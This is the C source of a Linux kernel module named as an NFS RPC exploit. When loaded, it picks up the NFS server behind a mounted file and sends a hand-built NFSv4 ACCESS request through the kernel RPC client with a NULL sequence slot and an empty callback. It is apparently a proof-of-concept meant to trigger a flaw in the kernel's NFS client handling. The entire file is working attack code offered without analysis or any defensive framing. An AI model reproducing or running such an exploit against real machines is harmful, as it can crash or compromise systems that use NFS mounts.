#include <linux/module.h>
#include <linux/init.h>
#include <linux/sunrpc/sched.h> 	//rpc_run_task
#include <linux/namei.h>		//path walk
#include <linux/path.h>
#include <linux/nfs3.h>
#include <linux/nfs4.h>
#include <linux/nfs.h>
#include <linux/nfs_fs.h>

#include <linux/sched.h>

MODULE_LICENSE("GPL");

//extern struct workqueue_struct *nfsiod_workqueue;


static void init_sequence(struct nfs4_sequence_args *args,
                struct nfs4_sequence_res *res, int cache_reply)
{
	args->sa_slot = NULL;
	args->sa_cache_this = 0;
	args->sa_privileged = 0;
	if (cache_reply)
		args->sa_cache_this = 1;
	res->sr_slot = NULL;
}

static void rpc_empty_callback(struct rpc_task *task, void *data)
{
}

static const struct rpc_call_ops rpc_empty_ops = {
	.rpc_call_done = rpc_empty_callback,
};

static int __init nfs_rpc_exploit_init(void)
{
	int err;
	struct path path;
	struct nfs_server *server;
	//it has to exist, because from this file we get nfs server
	char file_name[] = "/mnt/temp_file";
	struct nfs4_accessres res = {};
	struct nfs4_accessargs args = {};
	struct rpc_message msg = {};
	struct rpc_task *task;
	struct rpc_task_setup task_setup_data = {};
	//int status;
	struct rpc_procinfo *procedures;

	err = kern_path(file_name, LOOKUP_FOLLOW, &path);
	if (err) {
		printk("file not founded\n");
		return err; 
	}
	server = NFS_SERVER((path.dentry)->d_inode);

	res.server = server;
	res.fattr = nfs_alloc_fattr();
	if (res.fattr == NULL)
		return -ENOMEM;

	args.fh = NFS_FH((path.dentry)->d_inode);
	args.bitmask = server->cache_consistency_bitmask;
	args.access = NFS4_ACCESS_READ;

	if(!(procedures = server->nfs_client->cl_rpcclient->cl_procinfo)){
		printk("no procedures\n");
		return -1;
	}
	msg.rpc_proc = &procedures[NFSPROC4_CLNT_ACCESS];
	msg.rpc_argp = &args;
	msg.rpc_resp = &res;
	msg.rpc_cred = rpc_lookup_cred();

	task_setup_data.rpc_client = server->client;
	task_setup_data.rpc_message = &msg;
	task_setup_data.callback_ops = &rpc_empty_ops;
	//task_setup_data.workqueue = nfsiod_workqueue;
	//task_setup_data.flags = RPC_TASK_ASYNC;

	init_sequence(&args.seq_args, &res.seq_res, 0);
	task = rpc_run_task(&task_setup_data);
	if (IS_ERR(task)){
		printk("bad task\n");
		kfree(res.fattr);
		return PTR_ERR(task);
	}
	//status = rpc_wait_for_completion_task(task);

	kfree(res.fattr);
	rpc_put_task(task);

	return 0;
}

static void __exit nfs_rpc_exploit_exit(void)
{

}

module_init(nfs_rpc_exploit_init);
module_exit(nfs_rpc_exploit_exit);